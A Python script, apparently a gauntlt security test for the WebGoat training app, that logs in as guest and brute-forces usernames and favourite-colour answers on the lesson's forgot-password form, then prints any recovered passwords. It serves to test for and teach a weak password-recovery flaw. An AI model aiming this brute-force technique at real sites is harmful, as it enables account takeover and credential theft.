import requests
import json
import string

url = "http://127.0.0.1:8080/WebGoat" #URL for webgoat
valSpace = 18  #distance between value and acutal password
lessonURL = url + "/service/lessonmenu.mvc"

payload = dict(username='guest', password='guest') #authentication info
s = requests.Session() #The session for this test
s.get(url)
s.post(url + "/j_spring_security_check;jsessionid=" + s.cookies.get('JSESSIONID'),data=payload) # authenticating webgoat for session s
r1 = s.get(lessonURL) #contains screen and menu for attack URL

# getting the url for the forgot password attack
parsed_json = json.loads(r1.content) 
attackURL = url  + "/"  + parsed_json[4]['children'][1]['link']

# possible usernames
usernames = []
f = open("/home/hacker/gauntlt-demo/examples/webgoat/vuln-38/usernames.txt")
for line in f:
	usernames.append(line.strip())
#usernames = ("bob", "ted", "dylan", "rob", "jeff", "admin")
#print usernames
# possible colors
colors = []
f = open("/home/hacker/gauntlt-demo/examples/webgoat/vuln-38/color.txt")
for line in f:
	colors.append(line.strip())
#colors = ("orange", "yellow", "red", "blue", "black", "purple", "green")
got_it = False
for u in usernames:
	fun = {"Username": u}
       	r2 = s.post(attackURL,data=fun) # submitting the username form with value u
        if "name='Color'"  in r2.text: # test if request is good here
		# if valid username then test all of the colors
        	for c in colors:        
	        	happy = {"Color": c}
		        r2 = s.post(attackURL,data=happy) # submitting the favorite color form with value c 
                        if "For security reasons" in r2.text: # test if request is good here
				# if valid favorite password then print all of the users information
				# this also means that there is a vulnerability
                                got_it = True
				value = int(r2.text.index("<tr><td>Password: "))				
				value = value + valSpace # starting index of the password
				endVal = int(r2.text.index("</td></tr></table>")) # end index of the password
				print "username=" + u, ", color=" + c, ", password=" + r2.text[value:endVal] # the users info
				break
# this will only print if there is no vulnerability
if not got_it:
        print "none found"


	
